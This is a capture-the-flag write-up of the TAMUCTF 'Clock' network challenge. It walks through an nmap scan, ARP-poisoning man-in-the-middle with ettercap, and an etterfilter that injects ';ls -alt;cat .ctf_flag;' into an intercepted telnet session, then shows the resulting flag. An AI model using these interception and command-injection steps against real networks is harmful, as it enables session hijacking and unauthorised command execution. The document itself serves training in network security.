# TAMUCTF Clock (Network/Pentest) Write-Up

### Jump straight in

    nmap 172.30.0.0/28
    
	Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 21:24 CST
	Nmap scan report for 172.30.0.2
	Host is up (0.087s latency).
	Not shown: 999 closed ports
	PORT   STATE SERVICE
	23/tcp open  telnet
	MAC Address: 02:42:16:55:5A:3B (Unknown)

	Nmap scan report for 172.30.0.3
	Host is up (0.087s latency).
	All 1000 scanned ports on 172.30.0.3 are closed
	MAC Address: 02:42:CF:07:5C:FF (Unknown)

	Nmap scan report for 172.30.0.14
	Host is up (0.0000060s latency).
	All 1000 scanned ports on 172.30.0.14 are closed

	Nmap done: 16 IP addresses (3 hosts up) scanned in 7.01 seconds


2. We telnet open and we also see 2 hosts online. `172.30.0.2 and 172.30.0.3`. Taking knowledge from the previous challenges we will now initiate an ARP spoofing ettercap.

	**Arp Spoofing**

	Lets crack open Ettercap

		ettercap -G 				Opens etter in graphical mode

	First we gotta tell ettercap what it’s doing open.

		Sniff > Unified Sniffing > tap0 > OK
		
		This is telling ettercap to sniff the unified network tap0 which is going to set out interface to the VPN we connected to for the challenges

	Next we need to tell ettercap where the hosts are. Or actually let it find them itself. 

		Hosts > Scan for hosts

	Done. It now knows who’s online

	Now we need to actually specify the mode of the ettercap man in the middle attack. 

		Mitm > Arp Poisioning > Sniff remote connections (leave Only poision one way OFF) > OK
		
		This is setting the Mitm mode to ARP spoofing.  


3. Now we shall slide on over to wireshark and view the traffic we are stealing. 

	We some interesting things. One of with is the telnet login, but funny enough we will never directly telnet to this box. 
	We also can see that there is a challenge thingy and that the box `172.30.0.3` seems to solve it automatically. My first thought was that we can get `172.30.0.3` to solve the challenge we get from our login but that was a bad idea. Finally discovered etterfilters with a little nudge and started to write one that would drop the letter `t` from the command it’s running `date` and inject `;ls -la;` with the semi-colons there to terminate the commands before and after

	Important Note: We chose to drop the letter t from date because it's the only letter in that command that is not applicable in hex. If we had chosen any other letter we would've corrupted the challenge and thus gotten an incorrect response and not allowed access into the box. 

4. As for the actual etterfilter…

		if (ip.dst == '172.30.0.2'){
			msg("Found packet. Now editing");
			replace("t", ";ls -alt;");
		}

	and now to run this we first need to compile. I named this script `clocketter` so my compile command was

		etterfilter clocketter

	at least for Kali Linux.

	Now we can venture on over to ettercap and give it the filter.

		Filters > Load a filter... > Select etterfilter.ef > OK

	You’ll know It’s working if you included a msg to tell you it’s working. Mine started dumping in `Found packet. Now editing` so I was hopeful I was about to see list of files. Wireshark dumped back…

		-bash: exi: command not found
		total 28
		-rw------- 1 alice alice 7888 Mar  4 03:34 .bash_history
		drwxr-xr-x 1 alice alice   41 Mar  3 20:36 .
		drwx------ 2 alice alice   34 Mar  3 20:36 .cache
		-rw------- 1 root  root    53 Feb 22 13:21 .naumotp_secret
		-rw-r--r-- 1 root  root    40 Feb 22 13:21 .ctf_flag
		drwxr-xr-x 1 root  root    19 Feb 22 13:21 ..
		-rw-r--r-- 1 alice alice  655 May 16  2017 .profile
		-rw-r--r-- 1 alice alice  220 Aug 31  2015 .bash_logout
		-rw-r--r-- 1 alice alice 3771 Aug 31  2015 .bashrc

	and thus I extended my etterfilter to be

		if (ip.dst == '172.30.0.2'){
			msg("Found packet. Now editing");
			replace("t", ";ls -alt;cat .ctf_flag;");
		}

	which dumped out

		-bash: exi: command not found
		total 28
		-rw------- 1 alice alice 7888 Mar  4 03:34 .bash_history
		drwxr-xr-x 1 alice alice   41 Mar  3 20:36 .
		drwx------ 2 alice alice   34 Mar  3 20:36 .cache
		-rw------- 1 root  root    53 Feb 22 13:21 .naumotp_secret
		-rw-r--r-- 1 root  root    40 Feb 22 13:21 .ctf_flag
		drwxr-xr-x 1 root  root    19 Feb 22 13:21 ..
		-rw-r--r-- 1 alice alice  655 May 16  2017 .profile
		-rw-r--r-- 1 alice alice  220 Aug 31  2015 .bash_logout
		-rw-r--r-- 1 alice alice 3771 Aug 31  2015 .bashrc
		gigem{a032b26061c96e00e2a0b9e991f11476}
		alice@f855819477fd:~$

	This was a relatively short challenge in the number of steps but figuring out etterfilters, finding this solution, and executing the hack was a long tedious process. 
